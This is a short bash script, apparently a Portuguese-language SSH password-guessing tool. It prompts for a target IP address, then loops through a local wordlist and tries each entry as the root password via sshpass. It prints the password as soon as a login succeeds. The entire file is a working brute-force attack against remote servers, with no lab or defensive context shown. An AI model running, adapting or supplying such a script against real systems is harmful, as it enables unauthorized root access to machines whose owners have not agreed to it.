#!/bin/bash
clear

echo -n "IP: "
read IP

tentativa=0
for x in $(cat ~/safado/dickattack/dicattack.txt); do
	sshpass -p $x ssh root@$IP exit &>/dev/null
	teste=$?
	if [[ $teste == '0' ]]; then
		echo "A SENHA DO USUARIO ROOT EH: $x"
		exit 0
	fi
	((tentativa++))
	echo "tentativa $tentativa"

done
